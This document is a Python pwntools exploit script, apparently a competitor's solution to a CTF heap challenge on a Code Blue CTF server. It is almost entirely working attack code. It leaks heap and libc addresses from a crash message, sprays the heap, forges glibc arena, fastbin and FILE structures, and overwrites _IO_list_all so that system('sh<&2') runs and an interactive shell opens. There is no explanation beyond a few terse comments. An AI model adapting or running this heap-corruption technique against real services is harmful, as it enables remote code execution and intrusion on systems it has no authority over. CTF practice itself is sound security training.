from pwn import *

HOST, PORT = '0.0.0.0', 11451
HOST, PORT = 'db.tasks.ctf.codeblue.jp', 11451
r = remote(HOST, PORT)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

menu = lambda: r.recvuntil('> ')
i0 = lambda: r.recvuntil(': ')

rc = 0
def create(cnt, one, title, payload, yo=False):
    global rc
    if not yo: menu()
    else: rc += 1
    r.sendline('1')
    if not yo: i0()
    else: rc += 1
    r.sendline(str(cnt))
    if one:
        r.sendline('Y')
        r.sendline(title)
        r.sendline(payload)
    else:
        r.sendline('n')
        r.sendline(title)
        r.sendline('\n'.join(payload))

def combine(dst, src, title):
    menu()
    r.sendline('6')
    i0()
    r.sendline(str(src))
    r.sendline(str(dst))
    r.sendline(title)

def copy(dst, src):
    menu()
    r.sendline('5')
    i0()
    r.sendline(str(src))
    i0()
    r.sendline(str(dst))

def quit():
    menu()
    r.sendline('7')

def edit(index, payload):
    menu()
    r.sendline('3')
    i0()
    r.sendline(str(index))
    r.sendline(payload)

create(2, True, '', 'a' * 0xf8 + p64(0)[:7])
create(1, True, '', 'a' * 0xfe)
create(1, True, '', 'a' * 0xfe)
copy(2, 1)

quit()
r.recvuntil('Error in')
data = r.recvall()
print data

def filter(x, a):
    return [int(z.split('-')[0], 16) for z in x.split('\n') if a in z][0]
heap = filter(data, '[heap]')
libc.address = filter(data, 'libc-')

# I've leaked all!

r = remote(HOST, PORT)

b=heap + 0x100
chunk = 0x41414141
fake_size = b-16-chunk & (2 ** 64 - 1)
# edit(0, ['', '', p64(0x100) + p64(fake_size) + p64(chunk) * 4])
cnt = (0x4000000 - heap) / (0x200 * 0x100)
print cnt
for i in range(cnt):
    create(0x1ff, True, '', '', True)
# TODO: modify offset for server!! 9 worked, but it differs because of ASLR, and can be calculated.
offset = 9
create(141-128+16*offset, True, '', '')
# cnt += 1



def write(idx, payload):
  l = payload.split('\x00')
  print l
  for i in range(0, len(l)):
    print len( 'b' * len('\x00'.join(l[:-i-1]) + '22') + l[-i-1])
    edit(idx, 'b' * len('\x00'.join(l[:-i-1]) + '22') + l[-i-1])



create(0x100, True, '', 'CRIT')
create(2, True, '', 'a' * 0xf8 + 'a' * 8 + chr(0x85))
create(1, True, '', 'a' * 0xfe)
create(1, True, '', 'a' * 0xfe)
create(1, True, 'x' * 0x78 + p32(0x2fe01).rstrip('\x00'), 'a')

target = libc.symbols['_IO_list_all']
payload = 'A' * (8 * 0x1f - 2) + '\x00' + p64(0x4000100) + 'X' * 0xf8
arena_base = len(payload)
fb_base = 0x4000100 + 0x880 + 8 + 0x500
payload += p32(0) + p32(2)
payload += p64(fb_base) + p64(0) * 9 # fastbins
payload += p64(0x4010680) + p64(0) + p64(target - 0x18) # top
payload = payload.ljust(0x880 + arena_base) + p64(0x7191919191919191)
payload += 'a' * (fb_base - 0x4000988)
sizez = 48
payload += 'sh<&2'.ljust(8, '\x00') + p64(sizez | 1) + p64(fb_base + sizez + 16) + p64(0x8181) + p64(2) + p64(libc.symbols['system']) + 'a' * (sizez - 48) + p64(0x9191) + p64(1) \
		+ p64(16) + p64(8) + p64(0) + p64(0) + 'l' * 96 + p32(0) + '?' * 20 + p64(fb_base - 0x18 + 5 * 8)

payload = payload.strip('\x00')

print payload.encode('hex')
write(cnt + 2 ,payload)

copy(cnt + 4, cnt + 3)
pause()
quit()
r.interactive()
data = r.recvall()
print data